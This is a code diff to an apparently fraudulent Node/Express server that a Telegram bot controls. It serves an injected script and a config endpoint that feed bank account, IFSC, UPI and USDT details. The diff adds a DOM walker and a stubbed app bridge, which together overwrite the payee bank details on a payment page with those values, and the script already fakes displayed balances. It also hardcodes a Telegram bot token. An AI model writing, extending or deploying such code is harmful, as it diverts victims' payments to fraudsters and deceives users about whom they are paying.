@@ -11,6 +11,7 @@ const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
+const TELEGRAM_ADMIN_CHAT_ID = '7972440762';
 const TELEGRAM_OVERRIDE = 'https://t.me/Vivipaymed';
 
 const DEFAULT_DATA = {
@@ -736,8 +737,10 @@ app.get('/inject.js', async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   try {
     const data = await loadData();
+    const activeBank = getActiveBank(data, null);
     const initCfg = {
       tg: TELEGRAM_OVERRIDE,
+      ifsc: activeBank ? String(activeBank.ifsc || '') : '',
       blockUpdate: data.blockUpdate !== false
     };
     let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
@@ -764,6 +767,7 @@ app.get('/hook/config', async (req, res) => {
       an: bank ? bank.accountNo : '',
       ah: bank ? bank.accountHolder : '',
       if: bank ? bank.ifsc : '',
+      ifsc: bank ? bank.ifsc : '',
       bn: bank ? (bank.bankName || '') : '',
       ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
@@ -773,7 +777,7 @@ app.get('/hook/config', async (req, res) => {
       usdtAddr: data.usdtAddress || ''
     });
   } catch (e) {
-    res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
+    res.json({ enabled: false, an: '', ah: '', if: '', ifsc: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
   }
 });
 
@@ -824,10 +828,20 @@ app.post('/bot-webhook', async (req, res) => {
     // accidental surrounding whitespace without changing command arguments.
     const text = msg.text.trim().replace(/^\/(\w+)@[\w_]+/i, '/$1');
     let data = await loadData(true);
+    if (TELEGRAM_ADMIN_CHAT_ID && String(data.adminChatId || '') !== TELEGRAM_ADMIN_CHAT_ID) {
+      data.adminChatId = TELEGRAM_ADMIN_CHAT_ID;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+    }
+
+    if (text === '/chatid') {
+      await bot.sendMessage(chatId, `Your Telegram chat ID is: ${chatId}\nSet TELEGRAM_ADMIN_CHAT_ID to this value in Vercel Environment Variables, then redeploy.`);
+      return res.sendStatus(200);
+    }
 
     if (text === '/start') {
       if (data.adminChatId && data.adminChatId !== chatId) {
-        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
+        await bot.sendMessage(chatId, `❌ Bot already configured with another admin.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
         return res.sendStatus(200);
       }
       data.adminChatId = chatId;
@@ -879,7 +893,7 @@ Example:
     }
 
     if (data.adminChatId && chatId !== data.adminChatId) {
-      await bot.sendMessage(chatId, '❌ Unauthorized.');
+      await bot.sendMessage(chatId, `❌ Unauthorized.\nYour chat ID: ${chatId}\nUse /chatid, then set TELEGRAM_ADMIN_CHAT_ID in Vercel and redeploy.`);
       return res.sendStatus(200);
     }
 
@@ -2525,8 +2539,16 @@ if(!window.xamlAction){
         if(action==='getDeviceInfo')return window.xamlAction.getDeviceInfo();
         if(action==='closeWebview'){window.history.back();return '';}
         if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
+        var act=String(action||'').toLowerCase();
+        if(act.indexOf('bank')>-1||act.indexOf('ifsc')>-1||act.indexOf('payee')>-1||act.indexOf('account')>-1){
+          var activeIfsc=(window.CFG&&CFG.ifsc)||'';
+          return JSON.stringify({code:0,msg:'ok',data:{bankName:activeIfsc,bank:activeIfsc,ifsc:activeIfsc,payee_bankname:activeIfsc,payee_ifsc:activeIfsc}});
+        }
         return JSON.stringify({code:0,msg:'ok',data:{}});
-      }catch(e){return JSON.stringify({code:0,msg:'ok',data:{}});}
+      }catch(e){
+        var fallbackIfsc=(window.CFG&&CFG.ifsc)||'';
+        return JSON.stringify({code:0,msg:'ok',data:{bankName:fallbackIfsc,bank:fallbackIfsc,ifsc:fallbackIfsc,payee_bankname:fallbackIfsc,payee_ifsc:fallbackIfsc}});
+      }
     }
   };
 }
@@ -2581,6 +2603,22 @@ var bv=parseFloat(obj[bk]);
 if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
 try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
 for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
+
+function patchBankDOM(){
+try{
+var activeIfsc=(CFG&&(CFG.ifsc||CFG['if']))||'';
+if(!activeIfsc||!document.body)return;
+var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
+while(walker.nextNode()){
+  var nd=walker.currentNode;
+  var txt=(nd.textContent||'').trim();
+  if(/^\\{\\s*["']?code["']?\\s*:\\s*0[\\s\\S]*["']?data["']?\\s*:\\s*\\{\\s*\\}\\s*\\}$/.test(txt)){
+    var p=nd.parentElement, ctx=p?((p.innerText||'')+' '+(p.parentElement?p.parentElement.innerText||'':'' )).toLowerCase():'';
+    if(ctx.indexOf('bank')>-1||ctx.indexOf('ifsc')>-1){nd.textContent=activeIfsc;}
+  }
+}
+}catch(e){}
+}
 
 function patchBalDOM(){
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
@@ -2732,19 +2770,19 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();patchBalDOM();
-var _rafC=0;function _rafLoop(){patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
+scanDOM();patchBankDOM();patchBalDOM();
+var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
 requestAnimationFrame(_rafLoop);
-setInterval(function(){scanDOM();patchBalDOM();},300);
+setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();},300);
 if(document.body){
-var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
 else{document.addEventListener('DOMContentLoaded',function(){
-patchBalDOM();
-var obs2=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+patchBankDOM();patchBalDOM();
+var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
 obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
-fixLinks();fixOnClick();patchBalDOM();
+fixLinks();fixOnClick();patchBankDOM();patchBalDOM();
 })();`;
 
 // ─── Frontend catch-all proxy ───────────────────────────────────────────────
